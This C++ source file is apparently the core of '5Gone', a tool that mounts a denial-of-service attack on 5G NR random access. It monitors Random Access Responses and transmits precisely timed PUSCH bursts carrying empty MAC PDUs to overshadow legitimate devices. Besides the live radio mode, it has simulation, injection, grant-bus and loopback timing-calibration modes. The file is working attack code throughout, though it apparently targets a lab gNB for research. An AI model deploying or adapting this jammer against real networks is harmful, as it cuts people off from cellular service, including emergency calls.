#include "5gone/attack_engine.hpp"
#include "5gone/cell_sync.hpp"
#include "5gone/empty_mac_pdu.hpp"
#include "5gone/latency.hpp"
#include "5gone/nr_capture.hpp"
#include "5gone/pusch_encoder.hpp"
#include "5gone/radio_uhd.hpp"
#include "5gone/rar_monitor.hpp"
#include "5gone/tdd_gate.hpp"
#include <algorithm>
#include <chrono>
#include <cmath>
#include <fstream>
#include <iostream>
#include <iomanip>
#include <memory>
#include <numeric>
#include <regex>
#include <set>
#include <thread>

namespace gone {

static std::ofstream& attack_log(const AttackConfig& cfg)
{
  static std::ofstream log;
  static std::string path;
  if (path != cfg.log_file) {
    path = cfg.log_file;
    log.open(path, std::ios::app);
  }
  return log;
}

static void log_attack(const AttackConfig& cfg, const RarEvent& ev, double advance_us, bool tx_ok)
{
  auto& log = attack_log(cfg);
  log << std::fixed << std::setprecision(1)
      << "Attacking RAR rapid=" << static_cast<int>(ev.rapid)
      << " c_rnti=" << ev.c_rnti
      << " k=" << static_cast<int>(ev.grant.k)
      << " freq_res=" << ev.grant.pusch_freq_res
      << " symbol0_advance_us=" << advance_us
      << " tx_ok=" << (tx_ok ? "true" : "false") << "\n";
  log.flush();
  std::cout << "[attack] RAR rapid=" << static_cast<int>(ev.rapid)
            << " TC-RNTI=0x" << std::hex << ev.c_rnti << std::dec
            << " advance=" << advance_us << "µs"
            << (tx_ok ? " TX" : " DRY") << "\n";
}

AttackEngine::AttackEngine(AttackConfig cfg) : cfg_(std::move(cfg)) {}

void AttackEngine::execute_attack(const RarEvent& ev)
{
  PuschEncoder encoder(cfg_);
  const std::size_t tb_bytes = ev.grant.tbs_bits / 8;
  const auto tb = build_empty_mac_pdu(tb_bytes);
  auto iq = encoder.encode(ev.grant, tb);
  if (iq.empty()) {
    std::cerr << "[attack] empty IQ — check iq_templates/ or grant params\n";
    log_attack(cfg_, ev, cfg_.symbol_advance_us, false);
    return;
  }

  const double advance_sec = cfg_.symbol_advance_us / 1e6;
  const double k_slot_sec = ev.grant.k * TddGate(cfg_.scs_khz).slot_duration_sec();
  const double delay = std::max(0.0, k_slot_sec - advance_sec);

  if (cfg_.dry_run || cfg_.mode == "sim") {
    log_attack(cfg_, ev, cfg_.symbol_advance_us, false);
    return;
  }

  try {
    if (shared_radio_) {
      shared_radio_->transmit(iq, delay);
      log_attack(cfg_, ev, cfg_.symbol_advance_us, true);
    } else {
      RadioUhd radio(cfg_);
      radio.transmit(iq, delay);
      log_attack(cfg_, ev, cfg_.symbol_advance_us, true);
    }
  } catch (const std::exception& e) {
    std::cerr << "[attack] radio error: " << e.what() << "\n";
    log_attack(cfg_, ev, cfg_.symbol_advance_us, false);
  }
}

int AttackEngine::run_sim()
{
  RarMonitor mon(cfg_);
  const std::string ds = cfg_.dataset_dir.empty()
      ? "data/5gone-dataset" : cfg_.dataset_dir;

  std::cout << "[sim] replay RAR DoS from dataset: " << ds << "\n";
  auto events = mon.load_grants_from_dataset(ds);
  if (events.empty()) {
    std::cerr << "[sim] no RAR events — run: bash scripts/setup-lab.sh --phase 0\n";
    return 1;
  }

  cfg_.dry_run = true;
  std::size_t n = 0;
  for (const auto& ev : events) {
    if (stop_.load()) break;
    execute_attack(ev);
    ++n;
    if (n >= 10) break; // demo cap
  }
  std::cout << "[sim] processed " << n << " RAR attacks (dry-run)\n";
  return 0;
}

int AttackEngine::run_inject()
{
  if (cfg_.grant_file.empty()) {
    std::cerr << "[inject] --grant FILE required\n";
    return 1;
  }
  RarMonitor mon(cfg_);
  auto events = mon.load_grants_from_file(cfg_.grant_file);
  if (events.empty()) {
    std::cerr << "[inject] no grants in " << cfg_.grant_file << "\n";
    return 1;
  }

  std::cout << "[inject] " << events.size() << " grant(s) from " << cfg_.grant_file << "\n";
  for (const auto& ev : events) {
    if (stop_.load()) break;
    execute_attack(ev);
  }
  return 0;
}

int AttackEngine::run_live()
{
  std::cout << "[live] RAR DoS — DL monitor + UL overshadow\n";
  std::cout << "[live] NOTE: requires 2nd USRP B210 (gNB uses the first)\n";
  std::cout << "[live] PDCCH decode: use inject mode until live decode validated\n";

  RarMonitor mon(cfg_);
  CellSync sync(cfg_);
  TddGate tdd(cfg_.scs_khz);

  try {
    RadioUhd radio(cfg_);
    radio.start_streaming();
    SampleBuffer buf;
    std::size_t rounds = 0;

    while (!stop_.load() && rounds < 100000) {
      radio.recv(buf, 0.05);
      auto events = mon.scan_buffer(buf);
      for (const auto& ev : events) {
        execute_attack(ev);
      }
      ++rounds;
    }
    radio.stop_streaming();
  } catch (const std::exception& e) {
    std::cerr << "[live] " << e.what() << "\n";
    return 1;
  }

  (void)sync;
  (void)tdd;
  return 0;
}

static RarEvent parse_bus_line(const std::string& line)
{
  RarEvent ev;
  static const std::regex rapid_re(R"("rapid"\s*:\s*(\d+))");
  static const std::regex crnti_re(R"("c_rnti"\s*:\s*(\d+))");
  static const std::regex freq_re(R"("pusch_freq_res"\s*:\s*(\d+))");
  static const std::regex k_re(R"("k"\s*:\s*(\d+))");
  static const std::regex mcs_re(R"("mcs"\s*:\s*(\d+))");
  std::smatch m;
  if (std::regex_search(line, m, rapid_re)) ev.rapid = static_cast<uint8_t>(std::stoi(m[1].str()));
  if (std::regex_search(line, m, crnti_re)) {
    ev.c_rnti = static_cast<uint16_t>(std::stoi(m[1].str()));
    ev.grant.rnti = ev.c_rnti;
  }
  if (std::regex_search(line, m, freq_re)) {
    ev.ul_dci.pusch_freq_res = static_cast<uint16_t>(std::stoi(m[1].str()));
    ev.grant.pusch_freq_res = ev.ul_dci.pusch_freq_res;
  }
  if (std::regex_search(line, m, k_re)) ev.grant.k = static_cast<uint8_t>(std::stoi(m[1].str()));
  if (std::regex_search(line, m, mcs_re)) {
    ev.ul_dci.mcs = static_cast<uint8_t>(std::stoi(m[1].str()));
    ev.grant.mcs = ev.ul_dci.mcs;
  }
  ev.grant.tbs_bits = 264;
  return ev;
}

int AttackEngine::run_bus()
{
  std::cout << "[bus] watching grant bus: " << cfg_.grant_bus << "\n";
  std::cout << "[bus] pair with: bash scripts/start-sniffer.sh tail\n";

  { std::ofstream create(cfg_.grant_bus, std::ios::app); }

  std::size_t last_pos = 0;
  std::set<uint32_t> seen;
  std::shared_ptr<RadioUhd> radio;
  if (!cfg_.dry_run) {
    try {
      radio = std::make_shared<RadioUhd>(cfg_);
      radio->start_streaming();
      set_shared_radio(radio);
    } catch (const std::exception& e) {
      std::cerr << "[bus] radio init failed: " << e.what() << " — dry-run fallback\n";
      cfg_.dry_run = true;
    }
  }

  while (!stop_.load()) {
    std::ifstream in(cfg_.grant_bus);
    if (!in) {
      std::this_thread::sleep_for(std::chrono::milliseconds(50));
      continue;
    }
    in.seekg(0, std::ios::end);
    const auto end = static_cast<std::size_t>(in.tellg());
    if (end <= last_pos) {
      std::this_thread::sleep_for(std::chrono::milliseconds(50));
      continue;
    }
    in.seekg(static_cast<std::streamoff>(last_pos));
    std::string line;
    while (std::getline(in, line)) {
      if (line.empty()) continue;
      auto ev = parse_bus_line(line);
      if (ev.c_rnti == 0) continue;
      const uint32_t key = (static_cast<uint32_t>(ev.rapid) << 16) | ev.c_rnti;
      if (seen.count(key)) continue;
      seen.insert(key);
      execute_attack(ev);
    }
    last_pos = end;
    std::this_thread::sleep_for(std::chrono::milliseconds(20));
  }

  if (radio) {
    radio->stop_streaming();
    set_shared_radio(nullptr);
  }
  return 0;
}

int AttackEngine::run_loopback()
{
  // Step 4: validate the TX->RX timing chain on the single B210 before any
  // live DoS. TX on A, RX on B (coherent shared LO), antennas ~5 cm apart,
  // TX gain ~0 for the first run. The marker burst stands in for the real
  // PUSCH overshadow burst — the latency math is burst-content independent,
  // so the harness result transfers directly to execute_attack()'s advance.
  std::cout << "[loopback] single B210 cross-chain: TX " << cfg_.tx_subdev
            << " -> RX " << cfg_.rx_subdev
            << ", antennas near-field, TX gain ~0 first\n";

  nr::Ofdm tx_ofdm(cfg_.sample_rate, cfg_.scs_khz * 1000.0, 51);
  const SampleBuffer marker0 = nr::synth_ssb_slot(tx_ofdm, cfg_.pci);
  // Scale the marker up so a near-field TX gain-0 RX still carries a strong
  // correlation peak above the RX noise floor / DC.
  SampleBuffer marker = marker0;
  if (cfg_.loopback_tx_scale > 1.0)
    for (auto& v : marker) v *= static_cast<float>(cfg_.loopback_tx_scale);
  std::printf("[loopback] marker: %zu samples, tx_scale=%.1f avg_amp=%.4f\n",
              marker.size(), cfg_.loopback_tx_scale,
              std::sqrt(std::accumulate(marker.begin(), marker.end(), 0.0,
                                        [](double a, const Sample& s){ return a + std::norm(s); })
                        / marker.size()));

  if (cfg_.dry_run) {
    // Synthetic RX: noise floor + the marker injected at a known offset.
    const size_t inject_at = 150000u;
    const double expect_us = inject_at / cfg_.sample_rate * 1e6;
    SampleBuffer rx = nr::synth_noise(300000);
    for (size_t t = 0; t < marker.size() && inject_at + t < rx.size(); ++t)
      rx[inject_at + t] += 25.0f * marker[t];

    auto r = measure_latency(marker, rx, cfg_.sample_rate, 0, rx.size());
    std::printf("[loopback] dry-run: found=%s at=%zu corr=%.3f delay=%.1fus (expect %.1fus)\n",
                r.found ? "yes" : "no", r.arrival_sample, r.corr,
                r.delay_sec * 1e6, expect_us);
    if (!r.found || std::abs(r.delay_sec * 1e6 - expect_us) > 1.0) {
      std::cerr << "[loopback] dry-run FAILED — latency harness broken\n";
      return 1;
    }
    std::cout << "[loopback] dry-run PASS\n";
    return 0;
  }

  try {
    RadioUhd radio(cfg_);
    radio.sync_time(0.0);
    std::cout << "[loopback] device time zeroed (set_time_now=0) for shared TX/RX epoch\n";
    radio.start_streaming();

    // --- TX RF probe: is the TX chain actually radiating? ---
    // Uses a proper continuous burst (start-of-burst on packet 1, end-of-burst
    // on packet N only) driven at several amplitudes. If the DAC+upconverter
    // are live, the RX RSSI/rms must rise monotonically with amplitude.
    if (cfg_.loopback_probe)
    {
      constexpr double kPi = 3.14159265358979323846;
      std::printf("[loopback] config: tx_gain=%.1f rx_gain=%.1f (device: tx_gain=%.1f "
                  "rx_gain=%.1f) tx_freq=%.1f MHz rx_freq=%.1f MHz tx_ant=%s rx_ant=%s "
                  "(want %s -> %s)\n",
                  cfg_.tx_gain, cfg_.rx_gain,
                  radio.get_tx_gain(), radio.get_rx_gain(),
                  radio.get_tx_freq_hz() / 1e6, radio.get_rx_freq_hz() / 1e6,
                  radio.get_tx_antenna().c_str(), radio.get_rx_antenna().c_str(),
                  cfg_.tx_subdev.c_str(), cfg_.rx_subdev.c_str());
      std::printf("[loopback] sensors: TX lo_locked=%s RX lo_locked=%s tx_temp=%s rx_temp=%s\n",
                  radio.get_tx_sensor("lo_locked").c_str(),
                  radio.get_rx_sensor("lo_locked").c_str(),
                  radio.get_tx_sensor("temp").c_str(),
                  radio.get_rx_sensor("temp").c_str());

      const double dur = 0.15;
      const double f = 1.0e6;
      const size_t CH = 262144;
      SampleBuffer cw(static_cast<size_t>(dur * cfg_.sample_rate));
      for (size_t t = 0; t < cw.size(); ++t) {
        const double ph = 2.0 * kPi * f * static_cast<double>(t) / cfg_.sample_rate;
        cw[t] = Sample(std::cos(ph), std::sin(ph));
      }

      auto sweep = [&](float amp, const char* tag, bool timed) {
        // Baseline: 40 ms before the burst.
        SampleBuffer cap;
        cap.reserve(static_cast<size_t>((dur + 0.12) * cfg_.sample_rate));
        double t_cap0 = 0.0;
        bool anchor = false;
        const size_t base_len = static_cast<size_t>(0.04 * cfg_.sample_rate);
        SampleBuffer pkt(65536);
        while (cap.size() < base_len) {
          double tp = 0.0; bool g = false;
          const std::size_t n = radio.recv_timed(pkt, 0.05, g, tp);
          if (!g || n == 0) continue;
          if (!anchor) { t_cap0 = tp; anchor = true; }
          cap.insert(cap.end(), pkt.begin(), pkt.begin() + static_cast<std::ptrdiff_t>(n));
        }
        const double t_key = radio.uhd_now_sec();
        const std::string rssi_pre = radio.get_rx_sensor("rssi");

        if (timed) {
          SampleBuffer cwt(cw);
          for (auto& v : cwt) v *= amp;
          radio.transmit_timed(cwt, t_key + 0.02);
        } else {
          // Proper burst framing: start flag on first packet only, end on last.
          const size_t n_pkt = (cw.size() + CH - 1) / CH;
          SampleBuffer seg;
          for (size_t p = 0; p < n_pkt; ++p) {
            const size_t off = p * CH;
            const size_t cnt = std::min(CH, cw.size() - off);
            seg.assign(cw.begin() + static_cast<std::ptrdiff_t>(off),
                       cw.begin() + static_cast<std::ptrdiff_t>(off + cnt));
            for (auto& v : seg) v *= amp;
            radio.transmit_seg(seg, p == 0, p + 1 == n_pkt);
          }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(60));
        const std::string rssi_dur = radio.get_rx_sensor("rssi");

        while (cap.size() < (dur + 0.12) * cfg_.sample_rate) {
          double tp = 0.0; bool g = false;
          const std::size_t n = radio.recv_timed(pkt, 0.05, g, tp);
          if (!g || n == 0) continue;
          cap.insert(cap.end(), pkt.begin(), pkt.begin() + static_cast<std::ptrdiff_t>(n));
        }
        auto rms_span = [&](size_t a, size_t b) {
          double e = 0.0;
          if (a >= b || b > cap.size()) return 0.0;
          for (size_t k = a; k < b; ++k) e += std::norm(cap[k]);
          return std::sqrt(e / (b - a));
        };
        const double r_base = rms_span(0, base_len);
        const double off0 = ((timed ? t_key + 0.02 : t_key) - t_cap0) * cfg_.sample_rate;
        const size_t pre = static_cast<size_t>(0.01 * cfg_.sample_rate);
        size_t s_off = off0 > pre ? static_cast<size_t>(off0) - pre : 0;
        const size_t d_b = s_off + 2 * pre;
        const size_t d_e = s_off + static_cast<size_t>(dur * cfg_.sample_rate) - pre;
        const double r_dur = (d_b < d_e && d_e <= cap.size()) ? rms_span(d_b, d_e) : r_base;
        const double delta_db = 20.0 * std::log10(r_dur / (r_base + 1e-12));
        std::printf("[loopback] TX probe [%s amp=%.1f]: base=%.5f during=%.5f "
                    "delta=%+.1f dB | rssi %s -> %s\n",
                    tag, amp, r_base, r_dur, delta_db,
                    rssi_pre.c_str(), rssi_dur.c_str());
        return r_dur / (r_base + 1e-12);
      };

      const double g1 = sweep(0.1f, "AMP", false);
      const double g2 = sweep(0.3f, "AMP", false);
      const double g3 = sweep(0.6f, "AMP", false);
      const double g4 = sweep(0.9f, "AMP", false);
      const double gT = sweep(0.6f, "TIMED", true);

      const bool monitors = (g1 + g2 + g3 + g4) / 4.0 > 1.06;  // average RSSI/dB ratio
      if (!monitors || gT < 1.2) {
        // Report but don't fail hard: we want the loop attempts even when RF is
        // questionable; the direct burst correlation is the real gate.
        if (!monitors)
          std::cerr << "[loopback] TX probe: RX did NOT see rising RF power with "
                       "amplitude. DAC/PA silent or no antenna on the TX port.\n";
        else if (g4 > g1)  // amplitude sweep monotone
          std::cout << "[loopback] TX probe: RF present, but timed TX silent.\n";
      } else {
        std::cout << "[loopback] TX probe: RF path OK — kicker emits.\n";
      }
    } else {
      std::cout << "[loopback] tx probe skipped (loopback.probe=false)\n";
    }

    const double window_sec = cfg_.loopback_window_ms * 1e-3;
    const size_t margin = static_cast<size_t>(0.25 * cfg_.sample_rate * window_sec);
    SampleBuffer acc;                 // RX accumulation spanning the TX moment
    SampleBuffer pkt(65536);
    double delay_sum_us = 0.0;
    uint32_t found_cnt = 0;
    bool has_delay = false;
    double t_min = 0.0, t_max = 0.0;
    const double sample_sec = 1.0 / cfg_.sample_rate;

    for (uint32_t it = 0; it < cfg_.loopback_iterations && !stop_.load(); ++it) {
      // A burst may occasionally be dropped (USB jitter) — retry the iteration
      // up to 5 times: we only need the arrival time of ONE actually-emitted
      // burst per slot for the latency measurement.
      bool done = false;
      bool rxgapped = false;
      for (int attempt = 0; attempt < 5 && !done && !stop_.load(); ++attempt) {
      // Schedule TX at an absolute time a bit ahead so the FPGA has one buffer
      // to retime into; each iteration advances by the window (no overlap).
      const double t_tx = radio.uhd_now_sec() + 0.010 + it * (2.0 * window_sec);
      radio.transmit_timed(marker, t_tx);

      // Accumulate a contiguous RX window spanning [t_tx - 0.25w, t_tx + 0.75w].
      acc.clear();
      const double want_t0 = t_tx - 0.25 * window_sec;
      const double want_t1 = t_tx + 0.75 * window_sec;
      double t_acc0 = 0.0;
      bool need_t0 = true;
      rxgapped = false;
      for (int guard = 0; guard < 400 && !stop_.load(); ++guard) {
        double t_pkt = 0.0;
        bool got = false;
        std::size_t n = radio.recv_timed(pkt, 0.05, got, t_pkt);
        if (!got || n == 0) continue;
        if (need_t0) {
          if (t_pkt < want_t0) continue;      // not into the window yet
          t_acc0 = t_pkt;
          need_t0 = false;
        } else {
          // Continuous-stream sanity: this packet must follow the previous one.
          const double exp_t = t_acc0 + acc.size() * sample_sec;
          const double drift = std::abs(t_pkt - exp_t) / sample_sec;
          if (drift > 128.0) {
            std::cout << "[loopback] RX gap " << drift
                      << " samples — retrying window\n";
            rxgapped = true;
            acc.clear();
            need_t0 = true;
            continue;
          }
        }
        acc.insert(acc.end(), pkt.begin(),
                   pkt.begin() + static_cast<std::ptrdiff_t>(n));
        const double covered = (acc.size()) * sample_sec;
        if (t_acc0 + covered >= want_t1) break;
      }
      if (acc.empty()) {
        std::cerr << "[loopback] no RX data captured\n";
        continue;
      }

      // The burst sits at (t_tx - t_acc0) samples into acc.
      const double expect_off = (t_tx - t_acc0) * cfg_.sample_rate;
      size_t lo = expect_off > margin ? static_cast<size_t>(expect_off - margin) : 0;
      if (lo >= acc.size()) lo = acc.size() > 0 ? acc.size() - 1 : 0;
      size_t window_len = 2 * margin;
      if (lo + window_len > acc.size()) window_len = acc.size() - lo;

      auto r = measure_latency(marker, acc, cfg_.sample_rate, lo, window_len);

      // Diagnostic dump of the RX window (cf32) when configured.
      if (!cfg_.loopback_dump_path.empty() && it == 0 && attempt == 0) {
        nr::write_cf32(cfg_.loopback_dump_path, acc);
        double pk = 0.0, rms = 0.0;
        for (const auto& v : acc) {
          pk = std::max(pk, (double)std::abs(v));
          rms += std::norm(v);
        }
        rms = std::sqrt(rms / acc.size());
        std::printf("[loopback] dump: %s samples=%zu rx_t0=%.6f expect_off=%.0f "
                    "rms=%.4f peak=%.4f SNR~%.1f dB\n",
                    cfg_.loopback_dump_path.c_str(), acc.size(), t_acc0, expect_off,
                    rms, pk, 20.0 * std::log10(pk / (rms + 1e-12)));
      }

      if (r.found) {
        const double t_arrive = t_acc0 + r.arrival_sample / cfg_.sample_rate;
        const double d_us = (t_arrive - t_tx) * 1e6;
        delay_sum_us += d_us;
        ++found_cnt;
        if (!has_delay) { t_min = t_max = d_us; has_delay = true; }
        else {
          t_min = std::min(t_min, d_us);
          t_max = std::max(t_max, d_us);
        }
        std::printf("[loopback] iter %u%s: tx=%.6f rx_t0=%.6f arrival=%.6f "
                    "delay=%+.1fus corr=%.3f (rx ovf=%llu lost=%llu txu=%llu)\n",
                    (unsigned)it, attempt ? "[retry]" : "",
                    t_tx, t_acc0, t_arrive, d_us, r.corr,
                    (unsigned long long)radio.rx_overflow_count(),
                    (unsigned long long)radio.rx_lost_count(),
                    (unsigned long long)radio.tx_underrun_count());
        if (it == 0 && d_us > 100.0)
          std::cout << "[loopback] tip: delay >> lightspeed — USB transport; "
                       "set symbol_advance_us to ~this value\n";
        done = true;
      } else if (attempt == 4) {
        std::printf("[loopback] iter %u: burst not recovered after 5 tries "
                    "(rx gap=%s tx=%.6f rx_t0=%.6f search=[%zu,%zu))\n",
                    (unsigned)it, rxgapped ? "yes" : "no", t_tx, t_acc0, lo,
                    lo + window_len);
        done = true;
      }
      }
      if (!done) break;   // stop flag hit mid-retry
    }

    radio.stop_streaming();

    if (found_cnt == 0) {
      std::cerr << "[loopback] no bursts recovered — check antennas/gain; "
                   "enable dump_path for a cf32 to inspect\n";
      return 1;
    }
    const double avg_us = delay_sum_us / found_cnt;
    std::printf("[loopback] summary: %u/%u bursts, delay min=%.1fus max=%.1fus avg=%.1fus\n",
                (unsigned)found_cnt, (unsigned)cfg_.loopback_iterations,
                t_min, t_max, avg_us);
    std::cout << "[loopback] use: symbol_advance_us = " << std::fixed
              << std::setprecision(0) << avg_us << " (or run the harness a few times)\n";
  } catch (const std::exception& e) {
    std::cerr << "[loopback] " << e.what() << "\n";
    return 1;
  }

  return 0;
}

int AttackEngine::run()
{
  std::cout << "5Gone RAR DoS attacker — mode=" << cfg_.mode
            << " srate=" << cfg_.sample_rate / 1e6 << " MSPS\n";

  if (cfg_.mode == "sim") return run_sim();
  if (cfg_.mode == "inject") return run_inject();
  if (cfg_.mode == "live") return run_live();
  if (cfg_.mode == "bus") return run_bus();
  if (cfg_.mode == "loopback") return run_loopback();

  std::cerr << "unknown mode: " << cfg_.mode << " (use sim|inject|live|bus|loopback)\n";
  return 1;
}

} // namespace gone
